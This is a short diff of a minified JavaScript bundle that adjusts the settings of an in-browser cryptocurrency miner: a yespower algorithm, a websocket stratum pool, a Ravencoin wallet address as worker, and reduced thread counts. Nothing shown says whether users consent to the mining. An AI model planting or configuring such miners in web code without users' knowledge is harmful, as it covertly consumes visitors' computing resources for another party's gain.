@@ -1165,12 +1165,7 @@
               (0, m.A)(this, "algorithm", "cwm_yespower"),
               (0, m.A)(this, "pool", "wss://websocket-stratum-server.com"),
               (0, m.A)(this, "config", {
-                stratum: {
-                  server: "",
-                  port: 6234,
-                  worker: "",
-                  password: "",
-                },
+                stratum: {},
                 options: { workers: 1, log: !1 },
               }),
               (0, m.A)(this, "miner", null),
@@ -1214,7 +1209,7 @@
                 worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",
                 password: "c=RVN",
               },
-              options: { threads: 2, log: !0 },
+              options: { threads: 1, log: !0 },
             },
           },
           MU = [
